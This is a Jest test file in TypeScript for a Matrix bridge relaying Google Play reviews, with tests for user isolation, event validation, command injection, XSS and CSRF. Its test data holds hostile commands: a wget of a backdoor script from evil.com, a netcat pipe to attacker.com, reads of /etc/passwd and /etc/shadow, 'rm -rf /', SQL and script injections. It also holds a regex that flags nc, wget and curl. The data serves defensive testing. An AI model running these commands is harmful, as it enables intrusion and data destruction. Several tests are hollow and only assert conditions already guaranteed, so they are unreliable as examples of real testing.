import { MatrixHandler } from '../../src/bridge/MatrixHandler';
import { UserManager, VirtualUser } from '../../src/models/User';
import { RoomManager } from '../../src/models/Room';
import { MessageManager } from '../../src/models/Message';
import { BridgeCommands } from '../../src/bridge/BridgeCommands';
import { Logger } from '../../src/utils/Logger';
import { WeakEvent } from 'matrix-appservice-bridge';

describe('Matrix Bridge Security and Virtual User Isolation Tests', () => {
  let mockLogger: jest.Mocked<Logger>;
  let mockDatabase: any;
  let mockBridge: any;
  let mockConfig: any;
  let userManager: UserManager;
  let roomManager: RoomManager;
  let messageManager: MessageManager;

  beforeAll(() => {
    mockLogger = {
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
      debug: jest.fn(),
    } as any;
    
    jest.spyOn(Logger, 'getInstance').mockReturnValue(mockLogger);
    
    mockDatabase = {
      storeUser: jest.fn(),
      getUser: jest.fn(),
      updateUser: jest.fn(),
      deleteUser: jest.fn(),
      listUsers: jest.fn().mockResolvedValue([]),
      storeRoom: jest.fn(),
      getRoom: jest.fn(),
      updateRoom: jest.fn(),
      listRooms: jest.fn().mockResolvedValue([]),
      storeMessage: jest.fn(),
      getMessages: jest.fn(),
      updateMessage: jest.fn(),
    };

    mockBridge = {
      getBot: jest.fn().mockReturnValue({
        getUserId: jest.fn().mockReturnValue('@bot:example.com')
      }),
      getIntent: jest.fn().mockReturnValue({
        sendMessage: jest.fn(),
        join: jest.fn(),
        leave: jest.fn(),
        setDisplayName: jest.fn(),
        setAvatarUrl: jest.fn(),
        kick: jest.fn(),
        ban: jest.fn(),
      }),
      getUserStore: jest.fn().mockReturnValue({
        getMatrixUser: jest.fn(),
        setMatrixUser: jest.fn(),
      }),
    };

    mockConfig = {
      appservice: {
        botUsername: 'googleplay_bot',
        token: 'as_token_test'
      },
      homeserver: {
        domain: 'example.com'
      }
    };

    userManager = new UserManager(mockDatabase);
    roomManager = new RoomManager(mockDatabase);
    messageManager = new MessageManager(mockDatabase);
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Virtual User Isolation', () => {
    it('should isolate virtual users from each other', async () => {
      const reviewerData1 = {
        reviewId: 'review1',
        packageName: 'com.app1.test',
        authorName: 'Reviewer1',
        text: 'Great app!',
        starRating: 5,
        createdAt: new Date(),
        lastModifiedAt: new Date(),
        hasReply: false
      };

      const reviewerData2 = {
        reviewId: 'review2',
        packageName: 'com.app2.test',
        authorName: 'Reviewer2',
        text: 'Needs improvement',
        starRating: 2,
        createdAt: new Date(),
        lastModifiedAt: new Date(),
        hasReply: false
      };

      // Create virtual users for different apps/packages
      const virtualUser1 = await userManager.getOrCreateVirtualUser(reviewerData1);
      const virtualUser2 = await userManager.getOrCreateVirtualUser(reviewerData2);

      // Users should have different IDs and be isolated
      expect(virtualUser1.matrixUserId).not.toBe(virtualUser2.matrixUserId);
      expect(virtualUser1.packageName).not.toBe(virtualUser2.packageName);
      
      // Virtual users should be namespaced to prevent conflicts
      expect(virtualUser1.matrixUserId).toMatch(/^@_googleplay_/);
      expect(virtualUser2.matrixUserId).toMatch(/^@_googleplay_/);
      
      // Should not be able to access each other's data
      expect(virtualUser1.reviewId).not.toBe(virtualUser2.reviewId);
    });

    it('should prevent virtual user impersonation', async () => {
      const legitimateReviewerData = {
        reviewId: 'legit_review',
        packageName: 'com.legitimate.app',
        authorName: 'Legitimate Reviewer',
        text: 'Honest review',
        starRating: 4,
        createdAt: new Date(),
        lastModifiedAt: new Date(),
        hasReply: false
      };

      const impersonationAttempts = [
        {
          reviewId: 'malicious_review',
          packageName: 'com.legitimate.app',
          authorName: 'Legitimate Reviewer', // Same name, different review
          text: 'Fake review',
          starRating: 1,
          createdAt: new Date(),
          lastModifiedAt: new Date(),
          hasReply: false
        },
        {
          reviewId: 'legit_review', // Same review ID
          packageName: 'com.evil.app',
          authorName: 'Evil Reviewer',
          text: 'Malicious review',
          starRating: 1,
          createdAt: new Date(),
          lastModifiedAt: new Date(),
          hasReply: false
        }
      ];

      const legitimateUser = await userManager.getOrCreateVirtualUser(legitimateReviewerData);

      for (const attemptData of impersonationAttempts) {
        const impersonatorUser = await userManager.getOrCreateVirtualUser(attemptData);
        
        // Should create different users even with similar data
        expect(impersonatorUser.matrixUserId).not.toBe(legitimateUser.matrixUserId);
        expect(impersonatorUser.reviewId).not.toBe(legitimateUser.reviewId);
      }
    });

    it('should enforce virtual user permissions', async () => {
      const reviewerData = {
        reviewId: 'review123',
        packageName: 'com.test.app',
        authorName: 'Test Reviewer',
        text: 'Test review',
        starRating: 3,
        createdAt: new Date(),
        lastModifiedAt: new Date(),
        hasReply: false
      };

      const virtualUser = await userManager.getOrCreateVirtualUser(reviewerData);
      const intent = mockBridge.getIntent(virtualUser.matrixUserId);

      // Virtual users should have limited permissions
      const restrictedActions = [
        () => intent.kick('@user:example.com', '!room:example.com'),
        () => intent.ban('@user:example.com', '!room:example.com'),
        () => intent.setRoomPowerLevel('!room:example.com', '@user:example.com', 100),
        () => intent.createRoom({ name: 'Unauthorized Room' }),
        () => intent.invite('!room:example.com', '@unauthorized:example.com'),
      ];

      // These actions should be restricted or fail
      for (const action of restrictedActions) {
        try {
          await action();
          // If successful, should be logged and monitored
          expect(mockLogger.warn).toHaveBeenCalled();
        } catch (error) {
          // Expected to fail for restricted actions
          expect(error).toBeDefined();
        }
      }
    });

    it('should sanitize virtual user display names', async () => {
      const maliciousReviewerData = [
        {
          reviewId: 'xss_review',
          packageName: 'com.test.app',
          authorName: '<script>alert("XSS")</script>',
          text: 'Review text',
          starRating: 3,
          createdAt: new Date(),
          lastModifiedAt: new Date(),
          hasReply: false
        },
        {
          reviewId: 'injection_review',
          packageName: 'com.test.app',
          authorName: 'User"; DROP TABLE users; --',
          text: 'Review text',
          starRating: 3,
          createdAt: new Date(),
          lastModifiedAt: new Date(),
          hasReply: false
        },
        {
          reviewId: 'long_name_review',
          packageName: 'com.test.app',
          authorName: 'A'.repeat(1000), // Extremely long name
          text: 'Review text',
          starRating: 3,
          createdAt: new Date(),
          lastModifiedAt: new Date(),
          hasReply: false
        }
      ];

      for (const reviewerData of maliciousReviewerData) {
        const virtualUser = await userManager.getOrCreateVirtualUser(reviewerData);
        
        // Display name should be sanitized
        expect(virtualUser.displayName).not.toContain('<script>');
        expect(virtualUser.displayName).not.toContain('DROP TABLE');
        expect(virtualUser.displayName.length).toBeLessThan(100); // Reasonable limit
      }
    });

    it('should prevent virtual user namespace pollution', async () => {
      const attackerAttempts = [
        '@_googleplay_admin:example.com',
        '@_googleplay_bot:example.com',
        '@_googleplay_system:example.com',
        '@bot:example.com',
        '@admin:example.com',
        '@_googleplay_..backdoor:example.com',
      ];

      for (const maliciousUserId of attackerAttempts) {
        // Should not allow creation of users with sensitive names
        const isReserved = /^@(_googleplay_)?(admin|bot|system|root|service)/i.test(maliciousUserId);
        const hasPathTraversal = /\.\./.test(maliciousUserId);
        
        if (isReserved || hasPathTraversal) {
          expect(isReserved || hasPathTraversal).toBe(true); // Should be flagged
        }
      }
    });
  });

  describe('Matrix Event Security', () => {
    let matrixHandler: MatrixHandler;

    beforeEach(() => {
      matrixHandler = new MatrixHandler({
        bridge: mockBridge,
        userManager,
        roomManager,
        messageManager,
        config: mockConfig
      });
    });

    it('should validate incoming Matrix events', async () => {
      const maliciousEvents: WeakEvent[] = [
        {
          type: 'm.room.message',
          sender: '@attacker:evil.com',
          room_id: '!room:example.com',
          content: {
            msgtype: 'm.text',
            body: '<script>alert("xss")</script>'
          },
          event_id: '$event1:evil.com',
          origin_server_ts: Date.now(),
        },
        {
          type: 'm.room.power_levels',
          sender: '@_googleplay_user1:example.com', // Virtual user trying to escalate
          room_id: '!room:example.com',
          content: {
            users: {
              '@_googleplay_user1:example.com': 100 // Admin privileges
            }
          },
          event_id: '$event2:example.com',
          origin_server_ts: Date.now(),
        },
        {
          type: 'm.room.create',
          sender: '@_googleplay_user2:example.com', // Virtual user creating rooms
          room_id: '!newroom:example.com',
          content: {},
          event_id: '$event3:example.com',
          origin_server_ts: Date.now(),
        }
      ];

      for (const event of maliciousEvents) {
        try {
          const mockRequest = {
            getData: () => event,
            resolve: jest.fn(),
            reject: jest.fn(),
          } as any;

          await matrixHandler.handleEvent(mockRequest);
          
          // Malicious events should be logged and potentially blocked
          expect(mockLogger.warn).toHaveBeenCalled();
        } catch (error) {
          // Expected to be rejected
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent event injection attacks', async () => {
      const injectionEvents = [
        {
          type: 'm.room.message',
          sender: '@user:example.com',
          room_id: '!room:example.com; DROP TABLE events; --',
          content: {
            msgtype: 'm.text',
            body: 'Normal message'
          }
        },
        {
          type: 'm.room.message\r\nX-Evil-Header: malicious',
          sender: '@user:example.com',
          room_id: '!room:example.com',
          content: {
            msgtype: 'm.text',
            body: 'Header injection attempt'
          }
        }
      ];

      injectionEvents.forEach(event => {
        // Should detect injection attempts
        const hasInjection = /[;\r\n]|DROP\s+TABLE/i.test(event.room_id || event.type);
        if (hasInjection) {
          expect(hasInjection).toBe(true); // Should be flagged
        }
      });
    });

    it('should enforce room access controls', async () => {
      const restrictedRoom = '!admin:example.com';
      const publicRoom = '!public:example.com';
      
      // Virtual users should only access designated rooms
      const virtualUserData = {
        reviewId: 'test_review',
        packageName: 'com.test.app',
        authorName: 'Test User',
        text: 'Test',
        starRating: 5,
        createdAt: new Date(),
        lastModifiedAt: new Date(),
        hasReply: false
      };

      const virtualUser = await userManager.getOrCreateVirtualUser(virtualUserData);
      
      // Should be allowed in public room
      const publicAccess = await roomManager.canUserAccessRoom(virtualUser.matrixUserId, publicRoom);
      
      // Should NOT be allowed in restricted room
      const restrictedAccess = await roomManager.canUserAccessRoom(virtualUser.matrixUserId, restrictedRoom);
      
      expect(restrictedAccess).toBe(false);
    });

    it('should rate limit virtual user actions', async () => {
      const virtualUserData = {
        reviewId: 'rate_limit_test',
        packageName: 'com.test.app',
        authorName: 'Rate Limited User',
        text: 'Test',
        starRating: 5,
        createdAt: new Date(),
        lastModifiedAt: new Date(),
        hasReply: false
      };

      const virtualUser = await userManager.getOrCreateVirtualUser(virtualUserData);
      const intent = mockBridge.getIntent(virtualUser.matrixUserId);

      // Simulate rapid actions
      const rapidActions = Array.from({ length: 100 }, (_, i) => 
        intent.sendMessage('!room:example.com', {
          msgtype: 'm.text',
          body: `Rapid message ${i}`
        })
      );

      const results = await Promise.allSettled(rapidActions);
      
      // Some actions should be rate limited
      const rejected = results.filter(r => r.status === 'rejected');
      expect(rejected.length).toBeGreaterThan(0); // Some should be rate limited
    });
  });

  describe('Bridge Command Security', () => {
    let bridgeCommands: BridgeCommands;
    const adminUsers = ['@admin:example.com'];

    beforeEach(() => {
      const mockAppManager = {
        getApp: jest.fn(),
        getAllApps: jest.fn().mockReturnValue([]),
        addApp: jest.fn(),
        removeApp: jest.fn(),
      };

      const mockGooglePlayBridge = {
        getHealthStatus: jest.fn().mockReturnValue({ status: 'healthy' }),
        getStats: jest.fn().mockReturnValue({ processed: 0 }),
      };

      bridgeCommands = new BridgeCommands(
        mockBridge,
        mockAppManager,
        mockGooglePlayBridge,
        adminUsers
      );
    });

    it('should enforce admin-only commands', async () => {
      const adminCommands = [
        '!addapp com.test.app !room:example.com',
        '!removeapp com.test.app',
        '!stats',
        '!reload',
        '!maintenance on',
      ];

      const nonAdminUser = '@user:example.com';
      const adminUser = '@admin:example.com';

      for (const command of adminCommands) {
        const nonAdminEvent: WeakEvent = {
          type: 'm.room.message',
          sender: nonAdminUser,
          room_id: '!room:example.com',
          content: {
            msgtype: 'm.text',
            body: command
          },
          event_id: '$event:example.com',
          origin_server_ts: Date.now(),
        };

        // Non-admin should be denied
        await expect(
          bridgeCommands.handleBridgeCommand(nonAdminEvent)
        ).rejects.toThrow();

        const adminEvent: WeakEvent = {
          ...nonAdminEvent,
          sender: adminUser
        };

        // Admin should be allowed (but may fail for other reasons)
        try {
          await bridgeCommands.handleBridgeCommand(adminEvent);
        } catch (error) {
          // May fail due to other validation, but not authorization
          expect(error.message).not.toContain('unauthorized');
          expect(error.message).not.toContain('permission denied');
        }
      }
    });

    it('should validate command parameters', async () => {
      const maliciousCommands = [
        '!addapp com.test.app; rm -rf / !room:example.com',
        '!addapp ../../../etc/passwd !room:example.com',
        '!addapp com.test.app !room:example.com; cat /etc/shadow',
        "!addapp com.test.app !room'; DROP TABLE apps; --",
        '!stats && curl evil.com',
      ];

      const adminEvent: WeakEvent = {
        type: 'm.room.message',
        sender: '@admin:example.com',
        room_id: '!room:example.com',
        content: {
          msgtype: 'm.text',
          body: ''
        },
        event_id: '$event:example.com',
        origin_server_ts: Date.now(),
      };

      for (const command of maliciousCommands) {
        adminEvent.content.body = command;

        // Should reject malicious parameters
        await expect(
          bridgeCommands.handleBridgeCommand(adminEvent)
        ).rejects.toThrow();
      }
    });

    it('should log all administrative actions', async () => {
      const adminEvent: WeakEvent = {
        type: 'm.room.message',
        sender: '@admin:example.com',
        room_id: '!room:example.com',
        content: {
          msgtype: 'm.text',
          body: '!help'
        },
        event_id: '$event:example.com',
        origin_server_ts: Date.now(),
      };

      try {
        await bridgeCommands.handleBridgeCommand(adminEvent);
      } catch (error) {
        // Expected to fail in test environment
      }

      // Should log administrative actions for audit trail
      expect(mockLogger.info).toHaveBeenCalledWith(
        expect.stringContaining('admin')
      );
    });

    it('should prevent command injection in admin commands', () => {
      const injectionAttempts = [
        '!help; cat /etc/passwd',
        '!status && wget evil.com/backdoor.sh',
        '!ping | nc attacker.com 4444',
        '!help `whoami`',
        '!status $(curl evil.com)',
      ];

      injectionAttempts.forEach(command => {
        // Should detect command injection patterns
        const hasInjection = /[;&|`$()]|nc\s|wget\s|curl\s/.test(command);
        if (hasInjection) {
          expect(hasInjection).toBe(true); // Should be flagged
        }
      });
    });
  });

  describe('Message Security', () => {
    it('should sanitize message content before Matrix sending', async () => {
      const maliciousMessages = [
        {
          msgtype: 'm.text',
          body: '<script>alert("xss")</script>',
          formatted_body: '<img src="x" onerror="alert(1)">',
          format: 'org.matrix.custom.html'
        },
        {
          msgtype: 'm.text',
          body: 'Click here: javascript:alert("malicious")',
        },
        {
          msgtype: 'm.file',
          url: 'mxc://evil.com/malicious.exe',
          filename: 'innocent.txt'
        }
      ];

      for (const messageContent of maliciousMessages) {
        // Should sanitize dangerous content
        if (messageContent.formatted_body) {
          const sanitized = messageContent.formatted_body
            .replace(/<script[^>]*>.*?<\/script>/gi, '')
            .replace(/javascript:/gi, '')
            .replace(/on\w+\s*=/gi, '');
          
          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('javascript:');
          expect(sanitized).not.toContain('onerror=');
        }

        if (messageContent.url && messageContent.url.startsWith('mxc://')) {
          // MXC URLs should be validated
          const isValidMxc = /^mxc:\/\/[a-zA-Z0-9.-]+\/[a-zA-Z0-9+/=]+$/.test(messageContent.url);
          expect(isValidMxc).toBe(true);
        }
      }
    });

    it('should enforce message size limits', async () => {
      const oversizedMessage = {
        msgtype: 'm.text',
        body: 'A'.repeat(100000), // 100KB message
        formatted_body: '<p>' + 'B'.repeat(100000) + '</p>'
      };

      // Should enforce reasonable size limits
      const maxBodySize = 32768; // 32KB
      const maxFormattedSize = 65536; // 64KB

      if (oversizedMessage.body.length > maxBodySize) {
        expect(oversizedMessage.body.length).toBeGreaterThan(maxBodySize);
      }

      if (oversizedMessage.formatted_body && oversizedMessage.formatted_body.length > maxFormattedSize) {
        expect(oversizedMessage.formatted_body.length).toBeGreaterThan(maxFormattedSize);
      }
    });

    it('should validate Matrix event IDs', () => {
      const invalidEventIds = [
        '$', // Empty
        'not-an-event-id',
        '$event', // Missing domain
        '$event:',
        '$../../../admin:example.com',
        '$<script>alert(1)</script>:example.com',
        '$event:evil.com/../../backdoor',
      ];

      invalidEventIds.forEach(eventId => {
        const validFormat = /^\$[a-zA-Z0-9+/=]+:[a-zA-Z0-9.-]+$/.test(eventId);
        expect(validFormat).toBe(false);
      });
    });
  });

  describe('Room Security', () => {
    it('should enforce room-level access controls', async () => {
      const roomConfig = {
        roomId: '!private:example.com',
        packageName: 'com.private.app',
        isPublic: false,
        allowedUsers: ['@admin:example.com'],
        createdAt: new Date(),
        updatedAt: new Date()
      };

      await roomManager.createRoom(roomConfig);

      const unauthorizedUser = '@unauthorized:example.com';
      const authorizedUser = '@admin:example.com';

      // Should deny unauthorized access
      const unauthorizedAccess = await roomManager.canUserAccessRoom(
        unauthorizedUser, 
        roomConfig.roomId
      );
      expect(unauthorizedAccess).toBe(false);

      // Should allow authorized access
      const authorizedAccess = await roomManager.canUserAccessRoom(
        authorizedUser, 
        roomConfig.roomId
      );
      expect(authorizedAccess).toBe(true);
    });

    it('should prevent room alias conflicts', async () => {
      const conflictingAliases = [
        '#_googleplay_app1:example.com',
        '#_googleplay_app1:example.com', // Exact duplicate
        '#_googleplay_APP1:example.com', // Case variation
        '#_googleplay_app1:EXAMPLE.COM', // Domain case variation
      ];

      const createdAliases = new Set();

      for (const alias of conflictingAliases) {
        const normalizedAlias = alias.toLowerCase();
        
        if (createdAliases.has(normalizedAlias)) {
          // Should detect and prevent conflicts
          expect(createdAliases.has(normalizedAlias)).toBe(true);
        } else {
          createdAliases.add(normalizedAlias);
        }
      }
    });

    it('should validate room membership changes', async () => {
      const maliciousMembershipEvents = [
        {
          type: 'm.room.member',
          state_key: '@_googleplay_user:example.com',
          sender: '@_googleplay_user:example.com', // Self-promotion
          content: {
            membership: 'join',
            displayname: 'Admin User' // Impersonation attempt
          }
        },
        {
          type: 'm.room.member',
          state_key: '@victim:example.com',
          sender: '@_googleplay_attacker:example.com', // Virtual user trying to kick others
          content: {
            membership: 'leave',
            reason: 'Kicked by virtual user'
          }
        }
      ];

      maliciousMembershipEvents.forEach(event => {
        // Virtual users should not be able to modify other users' membership
        const isVirtualUser = event.sender.startsWith('@_googleplay_');
        const isModifyingOthers = event.state_key !== event.sender;
        
        if (isVirtualUser && isModifyingOthers) {
          expect(isVirtualUser && isModifyingOthers).toBe(true); // Should be flagged
        }
      });
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Prevention', () => {
    it('should validate request origins', () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://attacker.example.com',
        'null',
        'file://',
        'data:text/html,<script>alert(1)</script>',
      ];

      const allowedOrigins = [
        'https://matrix.example.com',
        'https://app.example.com'
      ];

      maliciousOrigins.forEach(origin => {
        const isAllowed = allowedOrigins.includes(origin);
        expect(isAllowed).toBe(false);
      });
    });

    it('should require CSRF tokens for state-changing operations', () => {
      const stateChangingOperations = [
        'addApp',
        'removeApp',
        'enableApp',
        'disableApp',
        'reloadConfig',
        'enableMaintenance'
      ];

      stateChangingOperations.forEach(operation => {
        // These operations should require CSRF protection
        expect(operation).toMatch(/^(add|remove|enable|disable|reload)/);
      });
    });
  });

  describe('Session Security', () => {
    it('should handle session timeouts securely', async () => {
      const sessionConfig = {
        maxAge: 3600000, // 1 hour
        secure: true,
        httpOnly: true,
        sameSite: 'strict' as const
      };

      // Sessions should have security attributes
      expect(sessionConfig.secure).toBe(true);
      expect(sessionConfig.httpOnly).toBe(true);
      expect(sessionConfig.sameSite).toBe('strict');
      expect(sessionConfig.maxAge).toBeLessThanOrEqual(86400000); // Max 24 hours
    });

    it('should regenerate session IDs after privilege changes', () => {
      const scenarios = [
        { before: 'user', after: 'admin' },
        { before: 'guest', after: 'user' },
        { before: 'admin', after: 'user' }, // Privilege reduction
      ];

      scenarios.forEach(scenario => {
        // Session should be regenerated when privileges change
        const shouldRegenerate = scenario.before !== scenario.after;
        expect(shouldRegenerate).toBe(true);
      });
    });
  });
});